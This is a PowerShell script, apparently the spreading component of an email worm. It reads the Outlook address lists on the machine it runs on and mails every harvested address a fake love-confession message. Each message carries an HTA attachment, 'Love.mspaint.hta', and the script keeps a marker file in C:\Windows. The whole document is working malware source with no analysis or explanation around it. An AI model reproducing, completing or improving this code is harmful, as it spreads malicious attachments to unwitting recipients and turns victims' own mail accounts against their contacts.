


If (Test-Path -Path C:\Windows\MAPI-Client.mpi) {
}
Else {
echo. | Out-File -FilePath "C:\Windows\MAPI-Client.mpi"
}
$outlook = New-Object -ComObject Outlook.Application;
$mapiObj = $outlook.GetNameSpace("MAPI");
$addrList = $mapiObj.AddressLists;
foreach ($addr in $addrList){;
$addrEntCount = $addr.AddressEntries.Count;
For ($addrEntIndex = 2000; $addrEntIndex -lt $addrEntCount; $addrEntIndex++) {;
$addrEnt = $addr.AddressEntries($addrEntIndex);
$SMTP = $addrEnt.PropertyAccessor.GetProperty("http://schemas.microsoft.com/mapi/proptag/0x800F101F")
foreach ($EA in echo $SMTP | Select-String -Pattern 'SMTP:' -CaseSensitive -SimpleMatch){
$EmailAddr = "$EA".Substring(5)
   foreach($line in [System.IO.File]::ReadLines("C:\Windows\MAPI-Client.mpi")){
if($line -ne $EmailAddr){
$EmailAddr | Out-File -FilePath "C:\Windows\MAPI-Client.mpi"
$Mail = $Outlook.CreateItem(0);
$Mail.Recipients.Add($EmailAddr)
$Mail.Subject = "Heyyy... Umm"
$Mail.Body = "I have been battling my love filled emotions towards someone special... YOU! I hope u can give a me a chance, and I made some art for you! its quite the marvelous"
$Mail.Attachments.Add("C:\Users\OBAMA\OneDrive\Desktop\Love.mspaint.hta")
$Mail.Send
$Mail.Save
$Mail.Send()
};};};};
    












